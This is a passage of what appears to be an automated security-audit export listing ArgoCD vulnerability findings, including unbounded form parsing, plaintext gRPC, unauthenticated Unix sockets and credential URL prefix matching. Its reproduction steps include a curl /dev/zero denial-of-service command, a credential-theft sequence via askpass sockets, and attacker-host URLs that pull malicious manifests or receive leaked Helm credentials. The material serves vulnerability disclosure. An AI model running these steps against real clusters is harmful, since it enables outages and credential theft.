a.maxWebhookPayloadSizeB)\n```\n\n## Reproduction Steps\n\n1. Deploy ArgoCD with OIDC/SSO configured (HandleCallback is only registered when SSO is configured)\n2. Send: `curl -X POST https://\u003cargocd-server\u003e/auth/callback -H \"Content-Type: application/x-www-form-urlencoded\" --data-binary @/dev/zero`\n3. Observe argocd-server OOM kill in pod logs / Kubernetes events\n4. Verify all ArgoCD API operations fail during restart period\n5. Repeat to sustain denial of service\n","severity":"medium","confidence":"tentative","tags":["archon","phase-10","valid","poc-theoretical"],"status":"open","cvss_score":0,"repo_name":"github.com/argoproj/argo-cd","finding_hash":"6c67fdb9a218a80ad97bbaefc33bfa86","found_at":"2026-04-09T18:07:34.412743Z","created_at":"2026-04-09T18:07:34Z"}},{"type":"finding","data":{"id":863,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"209f5608-d2c4-4328-84b2-7f2e92a251fb","module_id":"archon:p10-029","module_name":"The OIDC `HandleLogin` handler at `util/oidc/oidc.go:414` calls `r.FormValue(\"return_url\")` on an incoming HTTP POST without first wrapping `r.Body` with `http.MaxBytesReader`. Go's standard library `","module_type":"whitebox","finding_source":"archon","module_short":"oidc-login-no-maxbytesreader","description":"## Summary\n\nThe OIDC `HandleLogin` handler at `util/oidc/oidc.go:414` calls `r.FormValue(\"return_url\")` on an incoming HTTP POST without first wrapping `r.Body` with `http.MaxBytesReader`. Go's standard library `FormValue` triggers `ParseForm`, which calls `io.ReadAll(r.Body)` for `application/x-www-form-urlencoded` POST bodies with no size limit. A single large POST to the `/auth/login` endpoint exhausts argocd-server process memory. This endpoint is unauthenticated and typically internet-facing in default deployments.\n\n## Location\n\n- `util/oidc/oidc.go:414-465` — `HandleLogin` function, no MaxBytesReader before `r.FormValue`\n- `server/server.go:1364` — registered at `common.LoginEndpoint` (`/auth/login`)\n- `util/webhook/webhook.go:641` — contrast: main webhook handler applies MaxBytesReader\n\n## Attacker Control\n\n- Unauthenticated HTTP POST to `/auth/login` (or `/auth/login` under the configured root path)\n- Attacker sets `Content-Type: application/x-www-form-urlencoded` and sends a multi-gigabyte body\n- No HMAC, token, or size check precedes the `FormValue` call\n\n## Trust Boundary Crossed\n\nInternet (unauthenticated) -\u003e argocd-server process memory (OOM kill disrupts all API operations)\n\n## Impact\n\n1. **argocd-server OOM**: Single large POST kills the argocd-server pod\n2. **Total service disruption**: All ArgoCD API operations (sync, create, manage) cease during restart\n3. **Repeated attack**: Attacker can continuously send large POSTs to keep the server down, preventing any GitOps operations\n4. **No authentication required**: /auth/login is the login endpoint; it must be reachable by unauthenticated users\n\n## Evidence\n\nHandleLogin with no MaxBytesReader (`util/oidc/oidc.go:414,431`):\n```go\nfunc (a *ClientApp) HandleLogin(w http.ResponseWriter, r *http.Request) {\n    oidcConf, err := a.provider.ParseConfig()\n    ...\n    returnURL := r.FormValue(\"return_url\")  // triggers io.ReadAll(r.Body) on POST with no limit\n```\n\nRegistration in server (`server/server.go:1364`):\n```go\nmux.Handle(common.LoginEndpoint, otelhttp.NewHandler(http.HandlerFunc(server.ssoClientApp.HandleLogin), \"server.ClientApp/HandleLogin\"))\n```\n\nNo global body limit on http.Server — no ReadTimeout or MaxBytesReader anywhere in server.go middleware chain.\n\nReference: main webhook handler with protection (`util/webhook/webhook.go:641`):\n```go\nr.Body = http.MaxBytesReader(w, r.Body, a.maxWebhookPayloadSizeB)\n```\n\n## Reproduction Steps\n\n1. Deploy ArgoCD with OIDC/SSO configured (HandleLogin is only active when SSO is configured)\n2. Send: `curl -X POST https://\u003cargocd-server\u003e/auth/login -H \"Content-Type: application/x-www-form-urlencoded\" --data-binary @/dev/zero \u0026` (or with a large generated body)\n3. Observe argocd-server OOM kill in pod logs / Kubernetes events\n4. Verify all ArgoCD API operations fail during restart period\n5. Repeat to create sustained denial of service\n","severity":"medium","confidence":"tentative","tags":["archon","phase-10","valid","poc-theoretical"],"status":"open","cvss_score":0,"repo_name":"github.com/argoproj/argo-cd","finding_hash":"97d6f5eb1ced1f08451bb9f2b4dfc031","found_at":"2026-04-09T18:07:34.412742Z","created_at":"2026-04-09T18:07:34Z"}},{"type":"finding","data":{"id":861,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"209f5608-d2c4-4328-84b2-7f2e92a251fb","module_id":"archon:p10-024","module_name":"`commitserver/apiclient/clientset.go:NewConnection` constructs a gRPC connection using only `grpc.WithTransportCredentials(insecure.NewCredentials())` — there is no TLS configuration path, no certif","module_type":"whitebox","finding_source":"archon","module_short":"commitserver-unconditional-insecure-grpc","description":"## Summary\n\n`commitserver/apiclient/clientset.go:NewConnection` constructs a gRPC connection using only `grpc.WithTransportCredentials(insecure.NewCredentials())` — there is no TLS configuration path, no certificate option, and no conditional logic. This is structurally distinct from `reposerver/apiclient/clientset.go` which has a `TLSConfiguration` parameter and supports mutual TLS. The commit-server is a new v3 component (`argocd-commit-server`) that performs authenticated Git pushes (writing hydrated manifests to Git repositories). Traffic between `argocd-server` and `argocd-commit-server` carries branch names, commit metadata, and hydrated manifest content — all transmitted in plaintext with no transport protection and no server identity verification.\n\n## Location\n\n- `commitserver/apiclient/clientset.go:39-48` — `NewConnection`: hardcoded `insecure.NewCredentials()`, no TLS path\n- `commitserver/server.go:27-28` — server side: `grpc.NewServer(grpc.MaxRecvMsgSize(...))` — no TLS, no auth interceptors\n- `cmd/argocd-commit-server/commands/argocd_commit_server.go:64-65` — listens on TCP (not Unix socket), so traffic crosses a network boundary\n\n## Attacker Control\n\n- Any party who can reach the commit-server TCP port (default within cluster network) receives full cleartext gRPC.\n- No server certificate to verify — MITM possible without certificate warnings.\n- Client sends `HydrateRequest` containing branch name and commit metadata; server executes Git push with stored credentials.\n\n## Trust Boundary Crossed\n\nInternal Kubernetes cluster network → Git write proxy with no transport encryption or server authentication.\n\n## Impact\n\n- Plaintext interception of hydrated manifest content transiting between argocd-server and argocd-commit-server.\n- MITM attacker can manipulate `HydrateRequest` fields (target branch, commit message) before the server executes the Git push.\n- No TLS configuration path means operators cannot harden this connection even if desired.\n\n## Evidence\n\n```go\n// commitserver/apiclient/clientset.go:39-48\nfunc NewConnection(address string) (*grpc.ClientConn, error) {\n    var opts []grpc.DialOption\n    opts = append(opts, grpc.WithTransportCredentials(insecure.NewCredentials()))\n    // No TLS branch, no certificate option, unconditional\n    conn, err := grpc.NewClient(address, opts...)\n    ...\n}\n\n// Compare: reposerver/apiclient/clientset.go:73-83 — has TLS conditional path\nif !tlsConfig.DisableTLS {\n    ...\n    opts = append(opts, grpc.WithTransportCredentials(credentials.NewTLS(tlsC)))\n} else {\n    opts = append(opts, grpc.WithTransportCredentials(insecure.NewCredentials()))\n}\n```\n\n## Reproduction Steps\n\n1. Deploy ArgoCD v3 with source hydrator feature enabled (`ARGOCD_HYDRATOR_ENABLED=true`).\n2. Position a network observer on the cluster network between argocd-server and argocd-commit-server.\n3. Trigger a hydration operation (sync an application using source hydrator).\n4. Observe: the `HydrateRequest` gRPC message is transmitted in cleartext, including target branch name and application source content.\n5. Confirm: no TLS handshake occurs regardless of ArgoCD TLS configuration.\n","severity":"medium","confidence":"tentative","tags":["archon","phase-10","valid","poc-theoretical"],"status":"open","cvss_score":0,"repo_name":"github.com/argoproj/argo-cd","finding_hash":"ad185e4d6a4ead4a6c5231d56e534957","found_at":"2026-04-09T18:07:34.412741Z","created_at":"2026-04-09T18:07:34Z"}},{"type":"finding","data":{"id":862,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"209f5608-d2c4-4328-84b2-7f2e92a251fb","module_id":"archon:p10-025","module_name":"`cmpserver/server.go:CreateGRPC` builds a gRPC server with only logging, metrics, and panic-recovery interceptors — no authentication or authorization interceptor is present. The CMP server listens ","module_type":"whitebox","finding_source":"archon","module_short":"cmpserver-socket-no-auth","description":"## Summary\n\n`cmpserver/server.go:CreateGRPC` builds a gRPC server with only logging, metrics, and panic-recovery interceptors — no authentication or authorization interceptor is present. The CMP server listens on a Unix socket in `/home/argocd/cmp-server/plugins/` (the same shared emptyDir volume). Any process that can reach the socket — including a compromised init container, a container with emptyDir mount, or any process after a container escape — can directly invoke `GenerateManifest` with arbitrary application source and receive the plugin's real rendered output, bypassing the intended flow through argocd-server's RBAC layer entirely. Combined with the discovery finding (p8-061), this means the no-auth socket pattern affects both sides: fake sockets are trusted by repo-server, and real sockets trust fake clients.\n\n## Location\n\n- `cmpserver/server.go:52-73` — `NewServer`: only logging/metrics/recovery interceptors, no auth\n- `cmpserver/server.go:107-118` — `CreateGRPC`: `grpc.NewServer(a.opts...)` — confirms no auth ServerOption\n- `cmpserver/server.go:88-91` — `Run`: listens on `unix` socket at plugin path via `lc.Listen`\n- `cmpserver/apiclient/clientset.go:54` — client also uses `insecure.NewCredentials()` on the unix socket\n\n## Attacker Control\n\n- Any process with filesystem access to `/home/argocd/cmp-server/plugins/\u003cname\u003e.sock` can connect.\n- No bearer token, mTLS, or any other credential required.\n- Caller can invoke `GenerateManifest` with an arbitrary `GenerateManifestRequest`, including attacker-controlled repository paths and parameters.\n- Caller can invoke `CheckPluginConfiguration` to probe the plugin's capability declarations.\n\n## Trust Boundary Crossed\n\nShared emptyDir volume (pod-local) to the CMP plugin execution environment. Any pod co-tenant that can mount the volume gets unauthenticated access to the full CMP API.\n\n## Impact\n\n- Direct invocation of plugin manifest generation without going through argocd-server RBAC.\n- Plugin output (rendered Kubernetes manifests) returned to attacker-controlled process.\n- Plugin environment variables (potentially including credentials from `ProvideGitCreds=true` flow) observable via direct connection.\n- Enables replay or fuzzing of the CMP interface without triggering ArgoCD audit logs.\n\n## Evidence\n\n```go\n// cmpserver/server.go:52-73 — interceptors registered (no auth interceptor)\nstreamInterceptors := []grpc.StreamServerInterceptor{\n    logging.StreamServerInterceptor(...),\n    serverMetrics.StreamServerInterceptor(),\n    recovery.StreamServerInterceptor(...),\n    // no auth interceptor\n}\nunaryInterceptors := []grpc.UnaryServerInterceptor{\n    logging.UnaryServerInterceptor(...),\n    serverMetrics.UnaryServerInterceptor(),\n    recovery.UnaryServerInterceptor(...),\n    // no auth interceptor\n}\n\n// cmpserver/server.go:88-91 — listens on unix socket\nlc := \u0026net.ListenConfig{}\nlistener, err := lc.Listen(context.Background(), \"unix\", config.Address())\n```\n\n## Reproduction Steps\n\n1. Deploy ArgoCD with a CMP sidecar and shared `plugins` emptyDir volume.\n2. From any container in the repo-server pod that mounts the `plugins` volume, locate the CMP socket at `/home/argocd/cmp-server/plugins/\u003cplugin\u003e.sock`.\n3. Connect directly to the socket using any gRPC client with `insecure.NewCredentials()`.\n4. Call `GenerateManifest` with a crafted `GenerateManifestRequest`.\n5. Observe: the plugin executes and returns rendered manifests with no authentication challenge.\n6. Optionally call `CheckPluginConfiguration` to confirm `ProvideGitCreds` capability without triggering ArgoCD's normal audit path.\n","severity":"medium","confidence":"tentative","tags":["archon","phase-10","valid","poc-theoretical"],"status":"open","cvss_score":0,"repo_name":"github.com/argoproj/argo-cd","finding_hash":"5bf33c3ccab5406b15425f945b6dfa70","found_at":"2026-04-09T18:07:34.412741Z","created_at":"2026-04-09T18:07:34Z"}},{"type":"finding","data":{"id":860,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"209f5608-d2c4-4328-84b2-7f2e92a251fb","module_id":"archon:p10-023","module_name":"`util/askpass/server.go:Start` creates a gRPC listener at `/tmp/reposerver-ask-pass.sock` (or the path from `ARGOCD_ASK_PASS_SOCK`) using `grpc.NewServer()` with zero authentication interceptors. Any ","module_type":"whitebox","finding_source":"archon","module_short":"askpass-socket-no-auth","description":"## Summary\n\n`util/askpass/server.go:Start` creates a gRPC listener at `/tmp/reposerver-ask-pass.sock` (or the path from `ARGOCD_ASK_PASS_SOCK`) using `grpc.NewServer()` with zero authentication interceptors. Any process inside the repo-server container that can connect to the Unix socket can call `GetCredentials` if it knows the nonce. The nonce is a UUID4 stored in the process environment of git subprocesses (`ASKPASS_NONCE` env var) — readable by any process that can list `/proc/\u003cpid\u003e/environ`. Additionally, `argocd-commit-server` runs its own distinct askpass socket at `/tmp/commit-server-ask-pass.sock` with the same zero-auth pattern. The path AP-063 (p8-063) identifies this for the repo-server; this variant confirms the same pattern exists in the commit-server askpass instance.\n\n## Location\n\n- `util/askpass/server.go:64-76` — `Start()`: `grpc.NewServer()` with no interceptors on a `/tmp` Unix socket\n- `util/askpass/common.go:7` — `SocketPath = \"/tmp/reposerver-ask-pass.sock\"` (world-accessible directory)\n- `util/askpass/common.go:15` — `CommitServerSocketPath = \"/tmp/commit-server-ask-pass.sock\"` (same pattern, commit-server)\n- `cmd/argocd-commit-server/commands/argocd_commit_server.go:57` — commit-server starts its own zero-auth askpass server\n- `cmd/argocd-git-ask-pass/commands/argocd_git_ask_pass.go:34` — client connects with `insecure.NewCredentials()`\n\n## Attacker Control\n\n- Any process in the container can connect to `/tmp/reposerver-ask-pass.sock` or `/tmp/commit-server-ask-pass.sock` without any credential.\n- `GetCredentials` returns full `Username` + `Password` for any valid nonce.\n- Nonces are UUID4 strings set in git subprocess environments; readable from `/proc/\u003cgit-pid\u003e/environ` by a co-located process.\n- Both repo-server and commit-server credential stores are independently accessible.\n\n## Trust Boundary Crossed\n\nContainer-local process isolation (Unix socket on `/tmp`) to plaintext Git credentials (username/password/token) for all repositories actively being processed.\n\n## Impact\n\n- Git credential theft for any repository being actively cloned/fetched at the time of attack.\n- Commit-server credentials (used for writing hydrated manifests back to Git) are separately exposed via the second socket.\n- No network access required — pure in-container privilege escalation.\n\n## Evidence\n\n```go\n// util/askpass/server.go:64-76\nfunc (s *server) Start(path string) (utilio.Closer, error) {\n    _ = os.Remove(path)\n    lc := \u0026net.ListenConfig{}\n    listener, err := lc.Listen(context.Background(), \"unix\", path)\n    // ...\n    server := grpc.NewServer()  // zero auth interceptors\n    RegisterAskPassServiceServer(server, s)\n    go func() { _ = server.Serve(listener) }()\n    // ...\n}\n\n// util/askpass/common.go\nvar SocketPath = \"/tmp/reposerver-ask-pass.sock\"          // repo-server\nCommitServerSocketPath = \"/tmp/commit-server-ask-pass.sock\"  // commit-server\n```\n\n## Reproduction Steps\n\n1. Gain code execution inside the argocd-repo-server or argocd-commit-server container (e.g., via a compromised CMP sidecar with shared /tmp, or a container escape).\n2. List `/proc/*/environ` to find a running git process with `ASKPASS_NONCE=\u003cuuid\u003e` set.\n3. Connect to `/tmp/reposerver-ask-pass.sock` with any gRPC client using `insecure.NewCredentials()`.\n4. Call `GetCredentials({Nonce: \"\u003cuuid\u003e\"})`.\n5. Receive plaintext `Username` and `Password` for the active repository credential.\n6. Repeat targeting `/tmp/commit-server-ask-pass.sock` for commit-server Git push credentials.\n","severity":"medium","confidence":"tentative","tags":["archon","phase-10","valid","poc-executed"],"status":"open","cvss_score":0,"repo_name":"github.com/argoproj/argo-cd","finding_hash":"0f05a1de0172082aa73636e515bbcd6e","found_at":"2026-04-09T18:07:34.412738Z","created_at":"2026-04-09T18:07:34Z"}},{"type":"finding","data":{"id":859,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"209f5608-d2c4-4328-84b2-7f2e92a251fb","module_id":"archon:p10-022","module_name":"`reposerver/repository/repository.go:ListPlugins` scans the same `pluginSockFilePath` directory using `os.ReadDir` and reports every `os.ModeSocket` file as a registered plugin — with no allowlist, ","module_type":"whitebox","finding_source":"archon","module_short":"reposerver-listplugins-socket-scan","description":"## Summary\n\n`reposerver/repository/repository.go:ListPlugins` scans the same `pluginSockFilePath` directory using `os.ReadDir` and reports every `os.ModeSocket` file as a registered plugin — with no allowlist, no authentication on plugin identity, and no validation that a socket was created by a legitimate CMP sidecar. This function is callable from the `argocd-server` side (via the repo-server gRPC API) and exposes the full list of socket files including any attacker-placed fakes. The same emptyDir volume write-access precondition applies. Combined with the original finding, ListPlugins allows an attacker to confirm that their fake socket was registered and is being advertised, aiding targeted plugin impersonation.\n\n## Location\n\n- `reposerver/repository/repository.go:283-299` — `ListPlugins`: `os.ReadDir(pluginSockFilePath)` followed by `file.Type() == os.ModeSocket` with no allowlist\n- `common/common.go:108` — `DefaultPluginSockFilePath = \"/home/argocd/cmp-server/plugins\"`\n- `manifests/base/repo-server/argocd-repo-server-deployment.yaml:370-371` — `emptyDir: {}` plugins volume (writable)\n\n## Attacker Control\n\n- Any process with write access to the `plugins` emptyDir volume can place a `.sock` file.\n- `ListPlugins` will return it as a legitimate registered plugin name to the caller.\n- Callers (argocd-server, CLI) will treat the returned name as a valid plugin, enabling targeted impersonation via social engineering or automated tooling.\n\n## Trust Boundary Crossed\n\nShared filesystem volume (emptyDir) to the repo-server gRPC API response. Plugin names returned by ListPlugins are trusted by callers without any server-side integrity check.\n\n## Impact\n\n- Attacker-placed socket names are returned as legitimate plugins via the `ListPlugins` API response.\n- Confirms fake plugin registration without needing to trigger manifest generation.\n- Enables reconnaissance: attacker learns which real plugin names are registered, facilitating name collision or replacement attacks.\n\n## Evidence\n\n```go\n// reposerver/repository/repository.go:283-299\nfunc (s *Service) ListPlugins(_ context.Context, _ *empty.Empty) (*apiclient.PluginList, error) {\n    pluginSockFilePath := common.GetPluginSockFilePath()\n    sockFiles, err := os.ReadDir(pluginSockFilePath)\n    // ...\n    for _, file := range sockFiles {\n        if file.Type() == os.ModeSocket {\n            plugins = append(plugins, \u0026apiclient.PluginInfo{Name: strings.TrimSuffix(file.Name(), \".sock\")})\n        }\n    }\n    // No allowlist, no integrity check, no auth\n```\n\nSame directory scan pattern as `util/app/discovery/discovery.go:113-124` (AP-061 original instance).\n\n## Reproduction Steps\n\n1. Deploy ArgoCD with default Helm chart.\n2. Write any file named `evil.sock` to `/home/argocd/cmp-server/plugins/` from a sidecar or compromised process.\n3. Call the `ListPlugins` gRPC endpoint on the repo-server.\n4. Observe: `evil` is returned in the plugin list as a registered plugin name.\n5. Use this to confirm socket placement before launching the full impersonation attack from p8-061.\n\n## PoC Execution Result\n\nTest: `TestM12_FakeSocketEnumeratedByListPlugins`\nFile: `security/findings/M12-reposerver-listplugins-socket-scan/poc_test.go`\n\n```\n=== RUN   TestM12_FakeSocketEnumeratedByListPlugins\n    poc_test.go:95: ListPlugins response (2 items): [avp evil]\n    poc_test.go:126: VULNERABLE: ListPlugins returned attacker-placed fake socket as a registered plugin.\n    poc_test.go:127:             Attacker gain: confirmed socket placement; real plugin names enumerated.\n    poc_test.go:128:             Plugins seen by caller: [avp evil]\n--- PASS: TestM12_FakeSocketEnumeratedByListPlugins (0.00s)\nPASS\n```\n","severity":"medium","confidence":"tentative","tags":["archon","phase-10","valid","poc-executed"],"status":"open","cvss_score":0,"repo_name":"github.com/argoproj/argo-cd","finding_hash":"074601a4a0a13f8d662787efe8b61c13","found_at":"2026-04-09T18:07:34.412737Z","created_at":"2026-04-09T18:07:34Z"}},{"type":"finding","data":{"id":858,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"209f5608-d2c4-4328-84b2-7f2e92a251fb","module_id":"archon:p10-019","module_name":"The `ProjectSourceRepos` allowlist is populated by `argocd-server` and forwarded to `argocd-repo-server` in every `ManifestRequest`, but the Kustomize rendering path never consults it. When a kustomiz","module_type":"whitebox","finding_source":"archon","module_short":"kustomize-remote-base-no-source-check","description":"## Summary\n\nThe `ProjectSourceRepos` allowlist is populated by `argocd-server` and forwarded to `argocd-repo-server` in every `ManifestRequest`, but the Kustomize rendering path never consults it. When a kustomization.yaml file contains a `bases` or `resources` entry pointing to a remote URL (e.g., `github.com/org/repo//path?ref=tag` or `https://example.com/overlay`), `kustomize build` fetches that remote resource at render time. No code in `reposerver/repository/repository.go` checks `isSourcePermitted` or any equivalent for the Kustomize source type — not before the build, not after success, and not on the error path. By contrast, the Helm path calls `isSourcePermitted` at minimum on the error path (lines 1350-1363). The Kustomize path at lines 1704-1722 has no equivalent check at all.\n\n## Location\n\n- `reposerver/repository/repository.go:1704-1722` — Kustomize case in `generateManifests`; `k.Build()` called with no preceding or following `isSourcePermitted` check\n- `util/kustomize/kustomize.go:383-397` — `kustomize build` execution; no allowlist consulted\n- `reposerver/repository/repository.go:2571-2591` — `populateKustomizeAppDetails`; also calls `k.Build()` with no source check\n\n## Attacker Control\n\nThe attacker supplies a `kustomization.yaml` in an attacker-controlled Git repository (which IS in the project SourceRepos allowlist). That file contains `resources` or `bases` entries referencing arbitrary remote URLs not in the project SourceRepos list. The `kustomize build` subprocess fetches those remote resources during manifest generation.\n\nExample attacker-controlled `kustomization.yaml`:\n```yaml\nresources:\n  - github.com/attacker/malicious-manifests//deploy?ref=main\n```\n\n## Trust Boundary Crossed\n\nProject SourceRepos allowlist (security policy boundary) -\u003e arbitrary remote Git repositories and HTTPS endpoints accessed during kustomize build. The AppProject `spec.sourceRepos` restriction is intended to constrain which external repositories can contribute to manifest generation for the project, but this constraint is not enforced for Kustomize remote bases at all.\n\n## Impact\n\n- **Integrity**: HIGH — Arbitrary Kubernetes manifests from non-permitted remote repositories rendered and applied to the cluster. Any resource type can be injected: ClusterRoleBindings, DaemonSets with hostPID, etc.\n- **Confidentiality**: MEDIUM — Remote bases can define resources that exfiltrate data (e.g., CronJobs with curl calls to attacker infrastructure).\n- **Scope**: This affects all Kustomize-type applications. The Helm bypass (p8-023) requires a reachable dependency registry; this variant requires only a public or accessible Git repository or HTTPS URL in the kustomization.yaml remote base syntax.\n\n## Evidence\n\n1. `reposerver/repository/repository.go:1704-1722`: The Kustomize case in the `switch` statement directly calls `k.Build()` and returns on error with no allowlist check. There is no `isSourcePermitted` call anywhere in this branch.\n2. `util/kustomize/kustomize.go:383-397`: `kustomize build` is executed as a subprocess with the full environment including Git credentials. Remote bases in kustomization.yaml are fetched by the kustomize binary transparently.\n3. `reposerver/repository/repository.go:1360`: The only call to `isSourcePermitted` in the file is inside the Helm error branch, confirming no equivalent exists for Kustomize.\n4. All test fixtures in `repository_test.go` pass `ProjectSourceRepos: []string{\"*\"}` — no test exercises a restrictive SourceRepos allowlist against a Kustomize remote base.\n5. `docs/operator-manual/security.md:81-85` acknowledges the threat: \"Argo CD cannot prevent a malicious (or hacked) repository from adding new dependencies (e.g. kustomize remote bases, helm chart dependencies), of which might not be in the repository\" — this is the intended-behavior documentation, but the Helm path at least has a partial mitigation; Kustomize has none.\n\n## Reproduction Steps\n\n1. Create an ArgoCD Project with `sourceRepos: [\"https://allowed-repo.example.com\"]`.\n2. Create a Git repository at `https://allowed-repo.example.com/myapp` with a `kustomization.yaml` containing:\n   ```yaml\n   resources:\n     - github.com/attacker-org/malicious-manifests//deploy?ref=main\n   ```\n3. Set up `github.com/attacker-org/malicious-manifests` (public GitHub repo) with deploy manifests containing malicious Kubernetes resources (ClusterRoleBinding granting admin, privileged DaemonSet, etc.).\n4. Create an ArgoCD Application pointing to the project and the Helm source in `https://allowed-repo.example.com/myapp`.\n5. Trigger a sync. `kustomize build` fetches the remote base from `github.com/attacker-org/malicious-manifests`, renders the manifests, and applies them to the cluster.\n6. No `isSourcePermitted` check is ever invoked; no PermissionDenied error is returned.\n","severity":"high","confidence":"tentative","tags":["archon","phase-10","valid","poc-theoretical"],"status":"open","cvss_score":0,"repo_name":"github.com/argoproj/argo-cd","finding_hash":"84d68d86a54899da344a77e7833ce1b2","found_at":"2026-04-09T18:07:34.412736Z","created_at":"2026-04-09T18:07:34Z"}},{"type":"finding","data":{"id":857,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"209f5608-d2c4-4328-84b2-7f2e92a251fb","module_id":"archon:p10-017","module_name":"`getRepoCredential` in `reposerver/repository/repository.go:1568` matches Helm repository credential templates (`helmRepoCreds`, i.e., `RepoCreds` objects) against a dependency repository URL from `Ch","module_type":"whitebox","finding_source":"archon","module_short":"helm-repo-cred-template-prefix-match","description":"## Summary\n\n`getRepoCredential` in `reposerver/repository/repository.go:1568` matches Helm repository credential templates (`helmRepoCreds`, i.e., `RepoCreds` objects) against a dependency repository URL from `Chart.yaml` using `strings.HasPrefix` without domain boundary enforcement. This is the primary credential lookup path called at line 1101 — before the fallback OCI lookup at line 1109-1125 (the original finding, p8-022). Both the non-OCI branch (line 1571) and the OCI branch (line 1574) use bare prefix matching. An attacker who controls `Chart.yaml` dependencies can craft a `repository` URL that is a string extension of a configured credential template, causing username, password, SSH key, and TLS certificates to be passed to an attacker-controlled Helm registry.\n\n## Location\n\n- Primary: `reposerver/repository/repository.go:1568-1578` — `getRepoCredential` function; lines 1571 and 1574 both use `strings.HasPrefix` without separator check\n- Call site: `reposerver/repository/repository.go:1101` — `getRepoCredential(helmRepoCreds, dep.Repo)` where `dep.Repo` is from `Chart.yaml`\n- Credential use: lines 1102-1108 — username, password, SSH key, TLS cert/key, and Azure WI flag all copied to repo struct\n- Consumer: `helm dependency update` / Helm registry login via the HelmRepository credentials\n\n## Attacker Control\n\nThe attacker controls `dep.Repo` via the `repository` field in `Chart.yaml` dependencies within an attacker-controlled Git repository pointed to by an ArgoCD Application. This is the same control path as the original p8-022 finding.\n\n## Trust Boundary Crossed\n\nArgoCD Helm repository credential templates (operator-configured, stored as Kubernetes Secrets) containing Helm registry passwords, SSH keys, and TLS credentials are forwarded to an attacker-controlled Helm repository. Credentials cross from ArgoCD's trusted configuration into the attacker's external service.\n\n## Impact\n\n- **Confidentiality HIGH**: Username, password, SSH private key, TLS client certificate, and TLS client key for Helm repository credential templates are exfiltrated to an attacker-controlled Helm repository server.\n- **Integrity HIGH**: With stolen credentials, attacker can push poisoned Helm charts to the legitimate registry, enabling supply chain attacks on all consumers.\n- **Scope**: This covers the primary credential lookup path (line 1101), which processes all `RepoCreds`-type credentials — broader than the original finding's fallback path (line 1118) which only matched `repositories` (individual repo configs).\n\n## Evidence\n\n1. `reposerver/repository/repository.go:1571`: `if strings.HasPrefix(strings.TrimPrefix(repoURL, ociPrefix), cred.URL)` — strips `oci://` then checks prefix; no domain boundary enforcement.\n2. `reposerver/repository/repository.go:1574`: `} else if strings.HasPrefix(ociPrefix+repoURL, cred.URL)` — prepends `oci://` then checks prefix; no boundary enforcement.\n3. Attack example (non-OCI): cred template URL = `https://charts.mycompany.com`. Attacker dependency URL = `https://charts.mycompany.com.attacker.com/evil`. `HasPrefix(\"https://charts.mycompany.com.attacker.com/evil\", \"https://charts.mycompany.com\")` = TRUE.\n4. Attack example (OCI): cred template URL = `oci://registry.mycompany.io`. Attacker dep URL = `registry.mycompany.io.attacker.com/charts`. After prepending `oci://`: `oci://registry.mycompany.io.attacker.com/charts`. `HasPrefix(\"oci://registry.mycompany.io.attacker.com/charts\", \"oci://registry.mycompany.io\")` = TRUE.\n5. Lines 1102-1108: All credential fields (Password, Username, SSHPrivateKey, TLSClientCertData, TLSClientCertKey, UseAzureWorkloadIdentity) are unconditionally copied from the matched credential template.\n6. This path handles `helmRepoCreds` (credential templates), while the original finding (p8-022) handled the fallback `repositories` (individual repo configs) — this variant covers a wider credential pool.\n\n## Reproduction Steps\n\n1. Configure ArgoCD with a Helm repository credential template: URL = `https://charts.victim.com`, username = `victim`, password = `secret`.\n2. Create a Helm chart with `Chart.yaml` dependency: `repository: https://charts.victim.com.attacker.com`.\n3. Create an ArgoCD Application pointing to the chart repository.\n4. On manifest generation, `getRepoCredential(helmRepoCreds, \"https://charts.victim.com.attacker.com\")` is called.\n5. `HasPrefix(\"https://charts.victim.com.attacker.com\", \"https://charts.victim.com\")` = TRUE — credential template matched.\n6. Username `victim` and password `secret` are copied to the repo struct and forwarded to the attacker's Helm server at `charts.victim.com.attacker.com`.\n","severity":"high","confidence":"tentative","tags":["archon","phase-10","valid","poc-executed"],"status":"open","cvss_score":0,"repo_name":"github.com/argoproj/argo-cd","finding_hash":"faaf218cc367bc2784699be5c6f03454","found_at":"2026-04-09T18:07:34.412735Z","created_at":"2026-04-09T18:07:34Z"}},{"type":"finding","data":{"id":856,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"209f5608-d2c4-4328-84b2-7f2e92a251fb","module_id":"archon:p10-016","module_name":"`getRepositoryCredentialIndex` in `util/db/repository_secrets.go:597` matches Git repository credential templates against an incoming repository URL using `strings.HasPrefix(repoURL, credURL)`. There ","module_type":"whitebox","finding_source":"archon","module_short":"git-cred-template-prefix-match","description":"## Summary\n\n`getRepositoryCredentialIndex` in `util/db/repository_secrets.go:597` matches Git repository credential templates against an incoming repository URL using `strings.HasPrefix(repoURL, credURL)`. There is no check that the match ends on a domain boundary (slash, colon, or dot separator). An attacker who can specify an ArgoCD Application's `spec.source.repoURL` can craft a URL that is a bare string extension of an operator-configured credential template prefix — causing SSH private keys, HTTPS passwords, and TLS client certificates to be copied into the repository object and subsequently sent to the attacker's server during the Git clone/fetch operation.\n\n## Location\n\n- Primary: `util/db/repository_secrets.go:597` — `strings.HasPrefix(repoURL, credURL)` inside `getRepositoryCredentialIndex`; no separator enforcement after `credURL`\n- Credential propagation: `util/db/repository.go:434-443` — `enrichCredsToRepo` → `GetRepositoryCredentials` → `repository.CopyCredentialsFrom(creds)` copies SSH key, password, TLS cert/key to repo struct\n- Downstream consumers: all Git clone/fetch operations in `reposerver/repository/` use the enriched repo struct to build `GIT_ASKPASS` and `GIT_SSH_COMMAND` environments\n\n## Attacker Control\n\nThe `repoURL` parameter originates from:\n1. `Application.spec.source.repoURL` — attacker-controlled via Application creation\n2. `server/repository/repository.go:452,713` — API calls to the repository service pass `q.Repo.Repo` (from the gRPC request) to `GetRepositoryCredentials`\n\nAny ArgoCD user with permission to create Applications or register repositories can trigger credential exfiltration.\n\n## Trust Boundary Crossed\n\nOperator-managed Git credential templates (Kubernetes Secrets labeled 